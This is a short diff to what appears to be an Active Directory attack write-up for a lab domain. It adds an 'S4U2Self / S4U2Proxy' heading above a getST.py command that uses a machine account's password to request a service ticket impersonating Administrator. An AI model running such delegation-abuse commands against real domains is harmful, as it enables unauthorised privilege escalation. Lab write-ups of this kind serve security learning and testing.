@@ -347,6 +347,8 @@ Normally a `Machine Account` will have a `SPN` of type `HOST`, so we are going t
 ```cpp
 servicePrincipalName: HOST/DAN-MACHINE.BURNED.CORP
 ```
+
+## S4U2Self / S4U2Proxy
 Let's do `S4U2Proxy` with `getST.py`:
 ```cpp
 svim @Burned in ~ ❯ getST.py 'BURNED.CORP'/'RRNLTXBZ$':':Z6aA+x0HLsW26$' -spn 'HOST/DAN-MACHINE.BURNED.CORP' -impersonate 'Administrator' -dc-ip '192.168.20.52'
